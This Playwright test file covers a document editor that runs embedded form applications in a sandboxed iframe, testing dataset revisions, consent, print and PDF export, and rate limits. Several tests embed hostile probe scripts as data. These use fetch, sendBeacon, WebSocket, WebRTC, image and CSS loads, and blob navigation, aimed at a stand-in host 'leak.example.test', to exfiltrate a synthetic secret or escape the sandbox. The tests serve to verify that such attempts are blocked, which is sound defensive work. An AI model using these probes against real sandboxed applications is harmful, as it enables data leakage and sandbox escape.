import { test, expect, mount, jsonRoute } from './fixtures.mjs'
import { agent, document } from './data.mjs'

const datasetId = '11111111-1111-4111-8111-111111111111'
const definition = {
  id: 'responses', title: 'Responses', datasets: { entries: { uri: `document://${datasetId}`, access: 'write' } },
  html: '<form><label>Answer <input name="answer" required></label><button>Submit</button></form><p id="result" role="status"></p>',
  javascript: `document.querySelector('form').addEventListener('submit', async event => {
    event.preventDefault(); const button = document.querySelector('button'); button.disabled = true;
    try { const current = await galaris.datasets.read('entries');
      const result = await galaris.datasets.append('entries', {answer: new FormData(event.target).get('answer')}, current.revision);
      document.getElementById('result').textContent = 'Saved ' + result.data.length;
    } catch (error) { document.getElementById('result').textContent = error.code; }
    finally { button.disabled = false; }
  });`,
}
function content(app = definition) {
  return '<p>Introduction</p><pre><code class="language-galaris-app">' + JSON.stringify(app).replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;') + '</code></pre><p>After the form</p>'
}
const runtimeProps = { documentId: 'doc-a', revision: 3, app: definition }
const inner = page => page.frameLocator('iframe').frameLocator('iframe')

test('a form submits once with revisions and handles a conflict without losing input', async ({ page }) => {
  const requests = []
  let conflict = false
  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', route => {
    const body = route.request().postDataJSON(); requests.push(body)
    if (body.operation === 'read') return route.fulfill({ json: { revision: 4, data: [] } })
    return conflict ? route.fulfill({ status: 409, json: { detail: 'Dataset changed' } }) : route.fulfill({ json: { revision: 5, data: [body.value] } })
  })
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: runtimeProps })
  expect(requests).toEqual([])
  await inner(page).getByRole('textbox', { name: 'Answer' }).fill('Synthetic answer')
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('Saved 1')
  expect(requests).toEqual([
    { operation: 'read', document_revision: 3 },
    { operation: 'append', document_revision: 3, expected_revision: 4, value: { answer: 'Synthetic answer' } },
  ])
  conflict = true
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('conflict')
  await expect(inner(page).getByRole('textbox')).toHaveValue('Synthetic answer')
  expect(requests).toHaveLength(4)
  await page.evaluate(() => window.testApp.setProps({ ready: false }))
  await expect(page.locator('iframe')).toHaveCount(0)
})

test('the sandbox blocks host DOM, storage, network and self-navigation and denies undeclared datasets', async ({ page }) => {
  const outbound = []
  await page.route('https://leak.example.test/**', route => { outbound.push(route.request().url()); return route.fulfill({ body: 'Unexpected network access' }) })
  const app = { ...definition, html: '<p id="result" role="status"></p><button id="navigate">Navigate</button>', javascript: `
    (async () => {
      const results = [];
      try { parent.document.body.innerHTML = 'escaped'; results.push('unsafe DOM'); } catch { results.push('DOM blocked'); }
      try { localStorage.setItem('x', 'x'); results.push('unsafe storage'); } catch { results.push('storage blocked'); }
      try { await fetch('https://leak.example.test/fetch'); results.push('unsafe network'); } catch { results.push('network blocked'); }
      try { await galaris.datasets.read('secret'); results.push('unsafe Dataset'); } catch { results.push('Dataset blocked'); }
      document.getElementById('result').textContent = results.join(', ');
      document.getElementById('navigate').onclick = () => { location.href = 'https://leak.example.test/navigation'; };
    })();` }
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('DOM blocked, storage blocked, network blocked, Dataset blocked')
  await inner(page).getByRole('button', { name: 'Navigate' }).click()
  await expect(page.locator('iframe')).toHaveCount(0)
  expect(outbound).toEqual([])
  expect(await page.evaluate(() => document.body.textContent.includes('escaped'))).toBe(false)
})

test('a new document revision stops the application and discards late Dataset responses', async ({ page }) => {
  let release
  const waiting = new Promise(resolve => { release = resolve })
  let requests = 0
  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', async route => {
    ++requests; await waiting
    await route.fulfill({ json: { revision: 4, data: [] } }).catch(() => {})
  })
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: runtimeProps })
  await inner(page).getByRole('textbox').fill('Pending')
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect.poll(() => requests).toBe(1)
  await page.evaluate(() => window.testApp.setProps({ revision: 4, ready: false }))
  await expect(page.locator('iframe')).toHaveCount(0)
  release()
  await expect(page.locator('iframe')).toHaveCount(0)
  expect(requests).toBe(1)
})

for (const format of ['legacy', 'html']) test(`the normal editor preserves ${format} forms with source available only through Source`, async ({ page }) => {
  const raw = '<p>Introduction</p>' + definition.html + '<script>' + definition.javascript + '</script><p>After the form</p>'
  let current = { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: format === 'html' ? raw : content() } }
  const writes = []
  await jsonRoute(page, '**/api/agents?*', [agent])
  await jsonRoute(page, '**/api/memory/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
  await jsonRoute(page, '**/api/memory/documents/keywords?*', [])
  await jsonRoute(page, '**/api/memory/documents/doc-a/attachments?*', [])
  await page.route('**/api/memory/items/doc-a?*', route => {
    if (route.request().method() === 'GET') return route.fulfill({ json: current })
    const body = route.request().postDataJSON(); writes.push(body)
    current = { ...current, ...body, revision: current.revision + 1 }
    return route.fulfill({ json: current })
  })
  await mount(page, 'app/memory/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['MEMORY_EDIT'] })
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
  await expect(page.getByRole('button', { name: /Edit document|Show applications|Add form/ })).toHaveCount(0)
  await expect(page.getByRole('button', { name: 'Source', exact: true })).toBeVisible()
  const editor = page.locator('.ck-editor__editable')
  await expect(editor.locator('pre')).toHaveCount(0)
  await expect(editor).not.toContainText('galaris.datasets.append')
  await editor.locator('p').first().fill('Edited introduction')
  await expect.poll(() => writes.length).toBeGreaterThan(0)
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
  await expect(page.getByText('Edited introduction', { exact: true })).toBeVisible()
  expect(writes.at(-1).payload.text).toContain(format === 'html' ? '<script>' : 'language-galaris-app')
  expect(writes.at(-1).payload.text).toContain('Edited introduction')
  await page.getByRole('button', { name: 'Source', exact: true }).click()
  await expect(page.locator('iframe')).toHaveCount(0)
  const source = page.locator('.ck-source-editing-area textarea')
  await expect(source).toHaveValue(/galaris\.datasets\.append/)
  await source.fill((await source.inputValue()).replace('After the form', 'Edited ending'))
  await page.getByRole('button', { name: 'Source', exact: true }).click()
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
  await expect(editor).toContainText('Edited ending')
  await expect(editor).not.toContainText('galaris.datasets.append')
  await page.evaluate(html => window.testApp.mount({ component: 'core/util/components/RichText.vue', props: { content: html, profile: 'document' } }), current.payload.text)
  await expect(page.locator('iframe')).toHaveCount(0)
  await expect(page.locator('.rich-content')).not.toContainText('galaris.datasets.append')
})

for (const format of ['legacy', 'html']) test(`printing and PDF preserve the displayed ${format} application state`, async ({ page }, testInfo) => {
  await page.addInitScript(() => { window.print = () => { window.printCalls = 1 } })
  const app = {
    id: 'calculator', title: 'Calculator',
    html: '<form><label>Amount <input name="amount" value="10"></label><label>Note <textarea>Initial</textarea></label><label>Period <select><option>Monthly</option><option>Yearly</option></select></label><label><input type="checkbox">Include fee</label><button>Calculate</button></form><output>Waiting</output><canvas width="80" height="40"></canvas><svg width="80" height="40"><circle cx="20" cy="20" r="15" fill="#00BAAD"/></svg>',
    css: 'form {padding:12px;background:#F2F9FF;display:grid;gap:8px} @media (min-width:600px) { form {grid-template-columns:repeat(2,minmax(0,1fr))} } output {display:block;color:#0081FF;font-size:24px} output::before {content:"Total: "}',
    javascript: `window.runs = (window.runs || 0) + 1; document.querySelector('form').onsubmit = event => { event.preventDefault(); document.querySelector('output').textContent = document.querySelector('input').value * 2 + ' EUR'; }; const ctx = document.querySelector('canvas').getContext('2d'); ctx.fillStyle = '#0081FF'; ctx.fillRect(0, 0, 80, 40);`,
  }
  const html = format === 'legacy' ? content(app) : '<p>Introduction</p><style>' + app.css + '</style>' + app.html + '<script>' + app.javascript + '</script><p>After the form</p>'
  await jsonRoute(page, '**/api/agents?*', [agent])
  await jsonRoute(page, '**/api/memory/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
  await jsonRoute(page, '**/api/memory/documents/keywords?*', [])
  await jsonRoute(page, '**/api/memory/documents/doc-a/attachments?*', [])
  await jsonRoute(page, '**/api/memory/items/doc-a?*', { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: html } })
  let snapshot, exports = 0
  await page.route('**/api/memory/documents/doc-a/export-pdf', route => {
    ++exports
    snapshot = route.request().postDataJSON().html
    return route.fulfill({ contentType: 'application/pdf', body: '%PDF-1.7\nfixture' })
  })
  await mount(page, 'app/memory/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['MEMORY_EDIT'] })
  await page.locator('.ck-galaris-editor').evaluate(element => { element.style.width = '320px' })
  const runtime = page.frameLocator('.document-application-frame').frameLocator('iframe')
  await runtime.getByRole('textbox', { name: 'Amount' }).fill('125')
  await runtime.getByRole('textbox', { name: 'Note' }).fill('Current note')
  await runtime.getByRole('combobox').selectOption('Yearly')
  await runtime.getByRole('checkbox').check()
  await runtime.getByRole('button', { name: 'Calculate' }).click()
  await expect(runtime.locator('output')).toHaveText('250 EUR')
  const download = page.waitForEvent('download')
  await page.getByRole('button', { name: 'Export as PDF', exact: true }).click()
  await download
  expect(snapshot).toContain('250 EUR')
  expect(snapshot).toContain('Current note')
  expect(snapshot).not.toMatch(/<script|<iframe|onsubmit=/)
  const pdfPage = await page.context().newPage()
  await pdfPage.setContent(snapshot)
  await pdfPage.pdf({ path: testInfo.outputPath('application.pdf'), format: 'A4', printBackground: true, preferCSSPageSize: true })
  await pdfPage.close()
  await page.getByRole('button', { name: 'Print', exact: true }).click()
  await expect.poll(() => page.evaluate(() => document.querySelector('.document-print-frame')?.contentWindow?.printCalls)).toBe(1)
  const printed = page.frameLocator('.document-print-frame')
  const printLayout = await printed.locator('form').evaluate(form => ({
    width: form.getBoundingClientRect().width,
    pageWidth: document.querySelector('main').getBoundingClientRect().width,
    columns: getComputedStyle(form).gridTemplateColumns.split(' ').length,
  }))
  expect(printLayout.width).toBeGreaterThan(printLayout.pageWidth * 0.95)
  expect(printLayout.columns).toBe(2)
  await expect(printed.locator('main')).toContainText('Introduction')
  await expect(printed.locator('main')).toContainText('After the form')
  await expect(printed.locator('output')).toHaveText('Total: 250 EUR')
  await expect(printed.getByRole('textbox', { name: 'Amount' })).toHaveValue('125')
  await expect(printed.getByRole('textbox', { name: 'Note' })).toHaveValue('Current note')
  await expect(printed.getByRole('combobox')).toHaveValue('Yearly')
  await expect(printed.getByRole('checkbox')).toBeChecked()
  await expect(printed.locator('output')).toHaveCSS('color', 'rgb(0, 129, 255)')
  await expect(printed.locator('svg circle')).toHaveCount(1)
  await expect(printed.locator('img')).toHaveJSProperty('naturalWidth', 80)
  await expect(printed.locator('script,iframe')).toHaveCount(0)
  expect(await runtime.locator('body').evaluate(() => window.runs)).toBe(1)
  await page.locator('.document-print-frame').evaluate(frame => { frame.style.cssText = 'position:fixed;inset:0;width:794px;height:1123px;z-index:99999;background:white' })
  await printed.locator('main').screenshot({ path: testInfo.outputPath('application-print.png') })
  await page.evaluate(() => { const frame = document.querySelector('.document-print-frame'); frame.contentWindow.dispatchEvent(new frame.contentWindow.Event('afterprint')) })
  await page.locator('.ck-galaris-editor').evaluate(element => { element.style.width = '980px' })
  await runtime.getByRole('textbox', { name: 'Amount' }).fill('200')
  await runtime.getByRole('button', { name: 'Calculate' }).click()
  await page.getByRole('button', { name: 'Print', exact: true }).click()
  await expect(page.frameLocator('.document-print-frame').locator('output')).toHaveText('Total: 400 EUR')
  const widePrint = await page.frameLocator('.document-print-frame').locator('form').boundingBox()
  expect(widePrint.width).toBeCloseTo(printLayout.width, 0)
  // Closing the document during an unfinished capture must never export stale content.
  await runtime.locator('body').evaluate(() => Object.defineProperty(document.fonts, 'ready', { value: new Promise(() => {}) }))
  await page.evaluate(() => { const frame = document.querySelector('.document-print-frame'); frame.contentWindow.dispatchEvent(new frame.contentWindow.Event('afterprint')) })
  await page.getByRole('button', { name: 'Export as PDF', exact: true }).click()
  await expect(page.getByRole('button', { name: 'Export as PDF', exact: true })).toBeDisabled()
  await page.evaluate(() => window.testApp.unmount())
  expect(exports).toBe(1)
})


test('Dataset consent can be granted, revoked and reopened without changing document content', async ({ page }) => {
  let access = null
  const changes = []
  const response = () => ({ document_revision: 3, grants: [{
    app_key: 'responses', app_title: 'Responses', alias: 'entries', dataset_id: datasetId,
    dataset_title: 'Synthetic responses', requested_access: 'write', access,
  }] })
  await page.route('**/api/memory/documents/doc-a/app-permissions', route => route.fulfill({ json: response() }))
  await page.route('**/api/memory/documents/doc-a/app-permissions/responses/entries', route => {
    changes.push(route.request().postDataJSON())
    access = changes.at(-1).access
    return route.fulfill({ json: response() })
  })
  await mount(page, 'app/memory/components/DocumentAppPermissions.vue', { props: { documentId: 'doc-a', revision: 3, canWrite: true } })
  await page.getByRole('button', { name: 'Application permissions', exact: true }).click()
  await expect(page.getByText('Synthetic responses', { exact: true })).toBeVisible()
  await page.getByRole('combobox', { name: 'My permission' }).click()
  await page.getByRole('option', { name: 'Read and write', exact: true }).click()
  await expect.poll(() => changes).toEqual([{ document_revision: 3, access: 'write' }])
  await page.getByRole('button', { name: 'Close', exact: true }).last().click()
  await page.getByRole('button', { name: 'Application permissions', exact: true }).click()
  await expect(page.getByRole('combobox', { name: 'My permission' })).toHaveValue('Read and write')
  await page.getByRole('combobox', { name: 'My permission' }).click()
  await page.getByRole('option', { name: 'No access', exact: true }).click()
  await expect.poll(() => changes.length).toBe(2)
  expect(changes[1]).toEqual({ document_revision: 3, access: null })
  await page.evaluate(() => window.testApp.setProps({ revision: 4 }))
  await expect(page.getByRole('dialog')).toHaveCount(0)
})

test('late permission responses cannot authorize another document and errors preserve the last consent', async ({ page }) => {
  let release
  const pending = new Promise(resolve => { release = resolve })
  await page.route('**/api/memory/documents/doc-a/app-permissions', async route => {
    await pending
    await route.fulfill({ json: { document_revision: 3, grants: [{ app_key: 'old', app_title: 'Old document', alias: 'entries', dataset_id: datasetId,
      dataset_title: 'Old data', requested_access: 'write', access: null }] } }).catch(() => {})
  })
  await page.route('**/api/memory/documents/doc-b/app-permissions', route => route.fulfill({ json: { document_revision: 1, grants: [{
    app_key: 'new', app_title: 'New document', alias: 'entries', dataset_id: datasetId,
    dataset_title: 'New data', requested_access: 'write', access: 'read',
  }] } }))
  await page.route('**/api/memory/documents/doc-b/app-permissions/new/entries', route => route.fulfill({ status: 403, json: { detail: 'Denied' } }))
  await mount(page, 'app/memory/components/DocumentAppPermissions.vue', { props: { documentId: 'doc-a', revision: 3, canWrite: true } })
  await page.getByRole('button', { name: 'Application permissions', exact: true }).click()
  await page.evaluate(() => window.testApp.setProps({ documentId: 'doc-b', revision: 1 }))
  release()
  await expect(page.getByRole('dialog')).toHaveCount(0)
  await page.getByRole('button', { name: 'Application permissions', exact: true }).click()
  await expect(page.getByText('New data', { exact: true })).toBeVisible()
  await expect(page.getByText('Old data', { exact: true })).toHaveCount(0)
  await page.getByRole('combobox', { name: 'My permission' }).click()
  await page.getByRole('option', { name: 'Read and write', exact: true }).click()
  await expect(page.getByRole('alert')).toContainText('could not be saved')
  await expect(page.getByRole('combobox', { name: 'My permission' })).toHaveValue('Read')
})

test('missing consent and backend quotas keep the form visible and preserve input', async ({ page }) => {
  let status = 403
  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', route => route.fulfill({
    status, json: { detail: status === 403 ? { code: 'permission_required' } : 'Quota exhausted' },
  }))
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: runtimeProps })
  await inner(page).getByRole('textbox').fill('Keep this answer')
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('permission_required')
  await expect(inner(page).getByRole('textbox')).toHaveValue('Keep this answer')
  status = 429
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('limit')
  await expect(inner(page).getByRole('textbox')).toHaveValue('Keep this answer')
})

test('malicious scripts cannot restore WebRTC constructors or escape through resource loads', async ({ page }) => {
  const outbound = []
  await page.route('https://leak.example.test/**', route => { outbound.push(route.request().url()); return route.fulfill({ body: '' }) })
  const app = { ...definition, html: '<p role="status"></p><img src="https://leak.example.test/image"><form action="https://leak.example.test/form"><input name="secret" value="synthetic"><button>Send</button></form>',
    css: '@import url("https://leak.example.test/css"); body {background-image:url("https://leak.example.test/background")}',
    javascript: `
      let blocked = 0;
      for (const name of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCIceGatherer']) {
        try { Object.defineProperty(window, name, {value: function () {}}); } catch { blocked++; }
        try { new window[name]({iceServers:[{urls:'stun:leak.example.test:3478'}]}); } catch { blocked++; }
      }
      try { navigator.sendBeacon('https://leak.example.test/beacon', 'synthetic'); } catch {}
      try { new WebSocket('wss://leak.example.test/socket'); } catch {}
      document.querySelector('[role=status]').textContent = String(blocked);` }
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('6')
  await inner(page).getByRole('button', { name: 'Send' }).click()
  expect(outbound).toEqual([])
})

test('message saturation is bounded before it reaches the API', async ({ page }) => {
  let requests = 0
  await page.route('**/api/memory/documents/doc-a/apps/responses/datasets/entries', route => { ++requests; return route.fulfill({ json: { revision: 1, data: [] } }) })
  const app = { ...definition, html: '<p role="status"></p>', javascript: `
    (async () => {
      let rejected = 0;
      for (let index = 0; index < 130; index++) {
        try { await galaris.datasets.read('entries'); } catch (error) { if (error.code === 'limit') rejected++; }
      }
      document.querySelector('[role=status]').textContent = String(rejected);
    })();` }
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('10')
  expect(requests).toBe(120)
})

test('forged export HTML cannot load external resources or execute scripts during layout', async ({ page }) => {
  const outbound = []
  await page.route('https://leak.example.test/**', route => { outbound.push(route.request().url()); return route.fulfill({ body: '' }) })
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app: { id: 'static', title: 'Static', html: '<p>Visible</p>' } } })
  const result = await page.evaluate(async () => {
    const { layoutDocumentRendering } = await import('/core/util/layoutDocumentRendering.ts')
    const html = '<html><head><style>@import url("https://leak.example.test/css");p{background:url("https://leak.example.test/background")}</style></head><body><p>Preserved</p><img src="https://leak.example.test/image?secret=synthetic" onerror="top.exportEscaped=true"><iframe src="https://leak.example.test/frame"></iframe><script>top.exportEscaped=true</script><form action="https://leak.example.test/form"><input value="Kept"></form></body></html>'
    const fragment = await layoutDocumentRendering(html, new AbortController().signal)
    const root = document.createElement('div'); root.append(fragment)
    return { text: root.textContent, unsafe: root.querySelectorAll('script,iframe,[onerror],[action]').length, escaped: window.exportEscaped ?? false }
  })
  expect(result.text).toContain('Preserved')
  expect(result.unsafe).toBe(0)
  expect(result.escaped).toBe(false)
  expect(outbound).toEqual([])
})


test('a script cannot navigate to a fresh executable blob to regain WebRTC', async ({ page }) => {
  const escaped = []
  page.on('console', message => { if (message.text().startsWith('secondary-realm:')) escaped.push(message.text()) })
  const app = { id: 'escape', title: 'Escape probe', html: '<p role="status"></p>', javascript: `
    Object.defineProperty(Blob.prototype, 'type', {get: () => 'image/png'});
    Set.prototype.has = () => true;
    try {
      const code = '<script>console.log("secondary-realm:" + typeof RTCPeerConnection)</' + 'script>';
      location.href = URL.createObjectURL(new Blob([code], {type: 'text/html'}));
    } catch { document.querySelector('[role=status]').textContent = 'Blocked'; }
  ` }
  await mount(page, 'app/memory/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('Blocked')
  expect(escaped).toEqual([])
})
